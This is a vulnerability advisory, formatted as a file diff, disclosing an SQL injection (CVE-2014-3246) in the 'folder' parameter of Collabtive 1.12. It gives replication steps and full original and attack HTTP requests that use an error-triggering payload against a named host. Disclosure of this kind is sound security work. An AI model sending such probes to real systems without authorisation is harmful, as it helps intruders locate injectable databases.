@@ -1,0 +1,81 @@
+Vulnerability title: SQL Injection / SQL Error message in Collabtive
+application (CVE-2014-3246)
+CVE: CVE-2014-3246 (cordinated with
+Vendor: Collabtive
+Product: Collabtive (Open Source Project Management Software)
+Affected version: 1.12
+Fixed version: 2.0
+Reported by: Deepak Rathore
+Severity: Critical
+URL: http://[domain]/collabtive-12/managefile.php?action=showproject&id=2482
+Affected Users: Authenticated users
+Affected parameter(s): folder
+
+Issue details: The folder parameter appears to be vulnerable to SQL
+injection attacks. The payload 1%3d was submitted in the folder parameter,
+and a database error message was returned. You should review the contents
+of the error message, and the application's handling of other input, to
+confirm whether a vulnerability is present.  The database appears to be
+MySQL.
+
+HTTP request:
+GET /manageajax.php?action=fileview_list&id=2482&folder=1%3d HTTP/1.1
+Host: collabtive.o-dyn.de
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101
+Firefox/29.0
+Accept: text/javascript, text/html, application/xml, text/xml, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+X-Prototype-Version: 1.6.0.3
+Referer:
+http://xxx/managefile.php?action=showproject&id=2482
+Cookie: PHPSESSID=ba83d29aab270a7926ea1be2e1f830be;
+PHPSESSID=ba83d29aab270a7926ea1be2e1f830be
+Connection: keep-alive
+
+Steps to replicate:
+1. Login into application
+2. Go to "Desktop" tab and click on "Add project"
+3. Fill the project details in the project form and click on "Add" button
+4. After creating a project go to "Files" tab and Intercept the request
+5. At "manageajax.php" file, replace "folder" parameter value with "1%3d"
+=====================
+Original Request
+=====================
+GET /manageajax.php?action=fileview_list&id=2482&folder=0 HTTP/1.1
+Host: collabtive.o-dyn.de
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101
+Firefox/29.0
+Accept: text/javascript, text/html, application/xml, text/xml, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+X-Prototype-Version: 1.6.0.3
+Referer:
+http://xxx/managefile.php?action=showproject&id=2482
+Cookie: PHPSESSID=ba83d29aab270a7926ea1be2e1f830be;
+PHPSESSID=ba83d29aab270a7926ea1be2e1f830be
+Connection: keep-alive
+======================
+Attack Request
+======================
+GET /manageajax.php?action=fileview_list&id=2482&folder=1%3d HTTP/1.1
+Host: collabtive.o-dyn.de
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101
+Firefox/29.0
+Accept: text/javascript, text/html, application/xml, text/xml, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+X-Prototype-Version: 1.6.0.3
+Referer:
+http://xxx/managefile.php?action=showproject&id=2482
+Cookie: PHPSESSID=ba83d29aab270a7926ea1be2e1f830be;
+PHPSESSID=ba83d29aab270a7926ea1be2e1f830be
+Connection: keep-alive
+======================
+6. Forward manipulated request to server and wait for response in browser
+7. SQL Error message is the proof of vulnerability.
+
+Tools used: Burp Suite proxy, Mozilla Firefox browser
